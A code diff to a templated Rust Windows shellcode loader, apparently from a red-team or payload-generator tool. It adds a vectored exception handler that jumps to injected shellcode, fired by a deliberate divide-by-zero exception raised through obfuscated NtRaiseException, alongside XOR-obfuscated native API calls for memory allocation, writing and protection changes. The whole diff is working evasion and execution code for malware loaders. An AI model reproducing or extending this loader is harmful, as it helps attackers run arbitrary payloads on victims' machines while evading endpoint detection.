@@ -6,13 +6,13 @@
 {{COMMON_MODULE}}
 
 use std::ffi::CString;
-use std::include_bytes;
 use std::ptr::null_mut;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE},
+        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, EXCEPTION_CONTINUE_EXECUTION},
         libloaderapi::{GetModuleHandleA, GetProcAddress},
+        errhandlingapi::AddVectoredExceptionHandler,
     },
     shared::{
         ntdef::{NT_SUCCESS, HANDLE},
@@ -32,6 +32,19 @@ const OBF_NT_ALLOCATE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}
 const OBF_NT_WRITE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
 const OBF_NT_PROTECT_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
 const OBF_NT_RAISE_EXCEPTION: &[u8] = &{{OBF_NT_RAISE_EXCEPTION}};
+
+// Global to hold shellcode address for the VEH handler
+static mut SHELLCODE_ADDR: *const u8 = null_mut();
+
+extern "system" fn veh_handler(_exception_info: *mut c_void) -> i32 {
+    unsafe {
+        if !SHELLCODE_ADDR.is_null() {
+            let shellcode_fn: extern "system" fn() = std::mem::transmute(SHELLCODE_ADDR);
+            shellcode_fn();
+        }
+    }
+    EXCEPTION_CONTINUE_EXECUTION
+}
 
 fn r(d: &[u8]) -> Vec<u8> {
     d.iter().map(|b| b ^ K).collect()
@@ -139,16 +152,20 @@ fn change_protection_to_rx(address: *mut c_void, size: usize) -> bool {
     }
 }
 
+unsafe fn register_veh_handler() -> bool {
+    let result = AddVectoredExceptionHandler(1, Some(veh_handler));
+    !result.is_null()
+}
+
 unsafe fn raise_exception() {
     let f_raise: FnNtRaiseException = std::mem::transmute(g(OBF_NT_RAISE_EXCEPTION));
     
     // EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094
-    let status = f_raise(
+    let _ = f_raise(
         0xC0000094 as *mut c_void,
         null_mut(),
         0,
     );
-    // We don't check the status as this is expected to not return
 }
 
 fn execute_via_veh(mut buf: Vec<u8>) {
@@ -168,7 +185,14 @@ fn execute_via_veh(mut buf: Vec<u8>) {
         return;
     }
 
-    // Trigger exception to execute our VEH handler
+    unsafe {
+        SHELLCODE_ADDR = base as *const u8;
+    }
+
+    if !unsafe { register_veh_handler() } {
+        return;
+    }
+
     unsafe { raise_exception(); }
 }
 
